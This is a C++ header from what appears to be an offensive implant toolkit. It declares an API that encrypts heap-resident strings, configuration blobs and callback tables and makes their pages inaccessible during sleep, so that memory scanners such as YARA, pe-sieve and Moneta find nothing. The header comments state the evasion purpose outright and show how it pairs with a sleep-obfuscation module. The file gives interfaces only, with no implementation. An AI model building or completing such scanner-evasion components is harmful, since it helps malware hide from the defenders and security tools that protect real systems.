#pragma once

/**
 * vh/heap_crypt.vh — Private heap encryption for memory-scanner evasion
 *
 * Complements sleep_obf (which encrypts code regions during idle) by
 * targeting heap-allocated data — strings, configuration blobs, callback
 * tables, and any other heap-resident artifacts that memory scanners
 * (YARA, pe-sieve, Moneta) signature.
 *
 * Design:
 *
 *   1. Caller registers heap regions via ``add_region()``.
 *   2. ``encrypt_all()`` XOR-encrypts every registered region in-place
 *      with a per-session random key, sets pages to PAGE_NOACCESS.
 *   3. ``decrypt_all()`` reverses the process.
 *
 * Intended to wrap sleep cycles:
 *
 *     vh::heap_crypt::encrypt_all();
 *     vh::sleep_obf::obfuscated_sleep(ms);   // code region encrypted
 *     vh::heap_crypt::decrypt_all();
 *
 * The combination leaves zero cleartext in user-mode memory during idle.
 *
 * Thread safety: all public functions are internally synchronized.
 * Callers must ensure no other thread accesses encrypted regions
 * between encrypt_all() and decrypt_all().
 */

#include <cstddef>
#include <cstdint>
#include <span>

namespace vh::heap_crypt {

// ─────────────────────────────────────────────
//  Region registration
// ─────────────────────────────────────────────

/// Opaque region handle.
struct RegionHandle {
    std::uint64_t id = 0;
    explicit operator bool() const noexcept { return id != 0; }
};

/// Register a heap region for encryption.  The span must remain valid
/// across encrypt/decrypt cycles — typically a VirtualAlloc'd buffer
/// or a custom-heap block.
[[nodiscard]] RegionHandle add_region(std::span<std::uint8_t> region) noexcept;

/// Register by raw pointer + size.
[[nodiscard]] RegionHandle add_region(void* base, std::size_t size) noexcept;

/// Unregister a region.  If currently encrypted, decrypts it first.
void remove_region(RegionHandle handle) noexcept;

// ─────────────────────────────────────────────
//  Bulk encrypt / decrypt
// ─────────────────────────────────────────────

/// Encrypt all registered regions and set pages to PAGE_NOACCESS.
void encrypt_all() noexcept;

/// Decrypt all registered regions and restore original page protection.
void decrypt_all() noexcept;

/// Returns true while regions are in encrypted state.
[[nodiscard]] bool is_encrypted() noexcept;

// ─────────────────────────────────────────────
//  Key management
// ─────────────────────────────────────────────

/// Rotate the encryption key.  Must be called while decrypted.
void rotate_key() noexcept;

/// Set a specific key (for deterministic testing).  Must be called
/// while decrypted and before any encrypt_all().
void set_key(std::span<const std::uint8_t> key) noexcept;

} // namespace vh::heap_crypt
